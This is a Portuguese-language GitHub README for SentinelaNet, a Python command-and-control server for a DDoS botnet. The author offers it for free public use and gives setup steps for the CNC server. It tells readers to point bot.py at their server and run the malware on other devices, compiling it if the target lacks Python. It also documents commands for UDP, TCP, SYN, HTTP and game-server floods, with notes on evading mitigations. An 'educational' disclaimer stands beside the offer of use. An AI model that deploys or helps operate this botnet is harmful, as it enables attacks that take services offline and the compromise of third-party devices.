<div align="center">
    <h1>SentinelaNet</h1>
    <h3>SentinelaNet é uma CNC (Comando e Controle) em Python, projetada para gerenciar um malware que realiza ataques de disparos em massa (DDoS).</h3>

  <p align="center">
      <img src="https://github.com/user-attachments/assets/00a9b589-ca17-4e50-982f-e27bc16c644c">
  </p>
  <p>Esta Botnet é para ser uma versão aprimorada do KryptonC2 e será disponibilizada publicamente e de forma gratuita. Vou hospedá-la e permitir que os usuários a utilizem sem a necessidade de compra.</p>
  
[Quero usar ou testar o SentinelaNet](https://github.com/CirqueiraDev/SentinelaNet/blob/main/payload/BOTNET.md)

</div>

<br>

## **Instalação** 📁
```shell script
git clone https://github.com/CirqueiraDev/SentinelaNet
```
```shell script
cd SentinelaNet
```
```shell script
pip install colorama
```
```shell script
python3 cnc.py <port>
```
**Os logins são salvos em logins.txt no formato "username:password" dentro do arquivo logins.txt** 

<br>

## Configure o malware 💣
```
Mude o IP e a porta do bot.py com o IP (IP publico se não for um teste local) e a porta do seu servidor CNC depois salve o arquivo.
```
```
Depois execute o malware em outro dispositivo que suporte python (caso o alvo não tenha o python você pode compilar o malware)
```

<br>

---

<div align="center">

  ### Admin/root Commands
  Command | Description
  --------|------------
  !admin, !adm | Shows list of admin commands
  !user, !u  | Add/List/Remove users
  !blacklist, !bl | Add/List/Remove blacklisted targets
    
  ### CNC Commands
  Command | Description
  --------|------------
  help, ? | Shows list of commands
  botnet | Shows list of botnet attack methods
  bots | Shows all conected bots
  clear, cls | Clears the console window screen
  exit, logout | Disconnects from the C&C server

  ### Attack Commands
  Command  | Usage | Description
  ---------|-------|-------------
  .UDP     | \<target> \<port> \<time> | Starts UDP Flood Bypass
  .TCP     | \<target> \<port> \<time> | Starts TCP Flood Bypass
  .MIX     | \<target> \<port> \<time> | Starts TCP and UDP Flood Bypass
  .SYN     | \<target> \<port> \<time> | Starts TCP SYN Flood
  .HEX     | \<target> \<port> \<time> | Starts HEXdecimal Flood
  .VSE     | \<target> \<port> \<time> | Send Valve Source Engine Protocol
  .MCPE    | \<target> \<port> \<time> | Minecraft PE Status Ping Protocol
  .FIVEM   | \<target> \<port> \<time> | Send FiveM Status Ping Protocol
  .HTTPGET | \<target> \<port> \<time> | Starts HTTP/1.1 GET Flood
  .HTTPPOST| \<target> \<port> \<time> | Starts HTTP/1.1 POST Flood
  .BROWSER | \<target> \<port> \<time> | Starts HTTP/1.1 BROWSER Simulator Flood
</div>

<br>

### 📌 Sobre os ataques Ataques Implementados
## 🔹 Ataques Baseados em Rede (Camada 3 e 4 - UDP/TCP)

### 🟢 UDP Flood (`attack_udp_bypass`)
- Envia pacotes UDP de tamanhos variados para sobrecarregar o alvo.
- Pode ser mitigado por firewalls e rate-limiting de ISPs.

### 🟢 TCP Flood (`attack_tcp_bypass`)
- Envia pacotes TCP continuamente para esgotar conexões do alvo.
- Se não houver handshake adequado, pode ser bloqueado facilmente.

### 🟢 SYN Flood (`attack_syn`)
- Envia requisições SYN para exaurir conexões TCP pendentes.
- Eficaz contra servidores mal protegidos.
- Firewalls modernos usam **SYN Cookies** para mitigar.

### 🟢 Ataque Híbrido (`attack_tcp_udp_bypass`)
- Alterna entre TCP e UDP para confundir defesas.
- Pode evitar filtros estáticos, mas ainda é detectável por análise comportamental.

## 🔹 Ataques em Aplicações (Camada 7 - HTTP)

### 🔵 HTTP GET Flood (`attack_http_get`)
- Simula acessos massivos a um site para sobrecarregar o servidor.
- Pode ser mitigado por **CAPTCHA, Cloudflare e Rate-Limiting**.

### 🔵 HTTP POST Flood (`attack_http_post`)
- Simula envio de dados para consumir processamento do servidor.
- Mais difícil de mitigar que GET, mas pode ser bloqueado com autenticação ou regras de firewall.

### 🔵 Browser Emulation (`attack_browser`)
- Simula tráfego de um navegador real para burlar proteções básicas.
- Pode enganar bloqueios simples, mas não funciona contra defesas avançadas.

## 🔹 Ataques Específicos para Jogos

### 🎮 FiveM Attack (`attack_fivem`)
- Explora vulnerabilidades no protocolo de comunicação do FiveM.
- FiveM tem melhorado suas proteções, mas servidores mal configurados ainda podem ser afetados.

### 🎮 Minecraft PE Attack (`attack_mcpe`)
- Envia pacotes corrompidos para explorar falhas na rede do jogo.
- Pode afetar servidores sem proteção adequada, mas padrões desse ataque já são bloqueados em alguns serviços.

### 🎮 VSE Query Flood (`attack_vse`)
- Explora o protocolo de consulta de servidores de jogos para gerar carga excessiva.
- Muito utilizado contra servidores **Source Engine** (CS:GO, TF2, etc.).

<br>

⚠️ **Nota:** Este projeto é apenas para fins educacionais e de pesquisa. O uso indevido pode ser ilegal e resultar em penalidades legais. Sempre utilize conhecimento de segurança para proteger sistemas, não para atacá-los.

<br>

---

### Last News ✨
- Updated CNC
    - Added blacklist ```01/03/2025```

- Updated Payload
    - Updated Browser Flood ```01/03/2025```
    - Added UDP Flood Bypass ```06/03/2025```
    - Roblox UDP Flood removed ```06/03/2025```
    - Added TCP and UDP Flood Bypass ```07/03/2025```
    - Updated SYN Flood ```07/03/2025```
---

### Owner 🎮
- **Discord: Cirqueira**
    - [YouTube](https://www.youtube.com/@cirqueiradev)
